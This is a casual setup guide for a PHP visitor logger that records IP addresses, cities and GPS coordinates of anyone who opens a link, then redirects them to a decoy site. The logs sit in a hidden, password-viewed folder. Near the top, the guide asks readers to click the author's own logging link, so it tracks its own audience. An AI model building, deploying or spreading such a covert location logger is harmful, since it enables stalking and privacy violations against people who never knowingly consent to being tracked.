# FortiFi Setup Instructions

ok so this is the actual setup part, follow step by step dont rush 😭

for me to know that u are here please [click here](https://fortifi.great-site.net/log.php)

---

## 🧩 Step 1: Create Hosting Account

go to:

https://infinityfree.net

create account
then create a free domain (like `something.great-site.net`)

wait until it gets activated

---

## 🧩 Step 2: Open File Manager

* go to your hosting dashboard
* open **File Manager**
* go to:

```id="9z0l6o"
htdocs/
```

this is your root folder

---

## 🧩 Step 3: Create Files

inside `htdocs/`, create:

```id="5qf6rc"
log.php
viewer.php
```

copy paste the php codes into them (from project files)

---

## 🧩 Step 4: Create Logs Folder

inside `htdocs/`:

create folder:

```id="e1hn0p"
private_logs
```

inside it create:

```id="g4saxc"
visitors.log
```

(it might auto create but just do it anyway)

---

## 🧩 Step 5: Protect Logs (important)

inside `private_logs/`, create:

```id="4zqdfk"
.htaccess
```

paste:

```id="m9v0y2"
Deny from all
```

this blocks direct access from browser

---

## 🧩 Step 6: Update Redirect URL

open `log.php`

find:

```php id="8u2o0s"
header("Location: https://shvtheamigo.github.io/FortiFi/");
```

replace with your actual site link if needed

---

## 🧩 Step 7: Test Logging

open:

```id="3o2a8x"
https://yourdomain/log.php
```

allow location

it should redirect automatically

---

## 🧩 Step 8: Check Logs

open:

```id="wq0v2r"
https://yourdomain/viewer.php
```

enter password

you should see entries

---

## 🧪 Expected Output

```id="3r5a8k"
Time: ...
Source: browser
IP: ...
City: ...
Lat: ...
Lon: ...
Accuracy: ...
```

---

## ⚠️ Common Issues

### ❌ Location not accurate

* user denied permission
* using desktop
* mobile data only

### ❌ Multiple logs

* browser retry
* refresh
* already fixed mostly

### ❌ City showing Unknown

* ip api blocked
* hosting limitation

---

## 🧠 Tips

* test on phone for best accuracy
* keep GPS ON
* HTTPS is important
* dont expect exact location always

---

## 🏁 Done

if everything works, nice
if not, debug slowly dont panic 😭

---
